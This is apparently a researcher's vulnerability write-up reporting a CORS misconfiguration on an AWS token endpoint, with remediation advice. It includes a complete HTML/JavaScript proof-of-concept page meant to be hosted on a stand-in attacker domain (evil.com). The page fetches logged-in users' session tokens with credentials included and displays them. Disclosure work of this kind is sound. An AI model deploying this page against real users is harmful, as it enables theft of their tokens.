# 🔓 CORS Misconfiguration on AWS (`vs.aws.amazon.com/token`)

## 👋 Hello Hackers!!! 

While testing the `vs.aws.amazon.com/token` endpoint, I discovered a
**CORS misconfiguration** that allows an attacker-controlled origin to
interact with sensitive AWS session and visitor tokens. The endpoint
reflects the `Origin` header and sets:

- `Access-Control-Allow-Origin: <attacker-controlled-origin>`  
- `Access-Control-Allow-Credentials: true`  

This combination makes it possible for any malicious website to steal
AWS tokens from logged-in users.

---

## ⚡ Steps to Reproduce

1. Log in to AWS in a web browser.  
2. Host or open a malicious HTML page (example:  
   `https://evil.com/poc.html`) with the following code:

```html
<html>
<head>
  <title>CORS PoC</title>
</head>
<body>
  <button onclick="getToken()">Get AWS Token</button>
  <pre id="output">— no response yet —</pre>

  <script>
    function getToken() {
      fetch("https://vs.aws.amazon.com/token", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: "{}"
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById("output").innerText = JSON.stringify(data, null, 2);
      })
      .catch(err => {
        document.getElementById("output").innerText = "Error: " + err;
      });
    }
  </script>
</body>
</html> 
```
3. Visit the page while authenticated to AWS.
4. Click the Get AWS Token button.
5. Observe that the response returns sensitive session/visitor tokens
from vs.aws.amazon.com, even though the request originated from a
malicious site.

## 🖼️ Proof of Concept(PoC)
![IMG_9726](https://github.com/user-attachments/assets/7a0ade34-a585-4432-942f-d5941c0e8a5b)
![IMG_9727](https://github.com/user-attachments/assets/5dec2c3a-4fe1-43e4-a61c-880a29123c00)

## 🎯 Impact

- An attacker can exfiltrate AWS session/visitor tokens (awsd2c-token) from any logged-in user.
- These tokens are long-lived (Max-Age=31536000) and could be used to:
  - 🕵️ Track/correlate users across devices and services.
  - ⚠️ Potentially hijack sessions if combined with other weaknesses.
  - 🔑 Access metadata intended only for authenticated users.
**Severity: 🔴 Critical (CVSS 9.3)**

## 💡 Takeaways
- Even small misconfigurations (like reflecting Origin) can lead to serious credential leakage.
- Long-lived tokens increase the window of exploitation.
- CORS should always be restricted to trusted domains only — never dynamic reflection.
- Adding Access-Control-Allow-Credentials: true without strong origin checks is a red flag.

## ✅ Recommendation
- Do not dynamically reflect the Origin header.
- Restrict Access-Control-Allow-Origin to trusted domains only (e.g., https://aws.amazon.com).
- Avoid setting Access-Control-Allow-Credentials: true with untrusted origins.





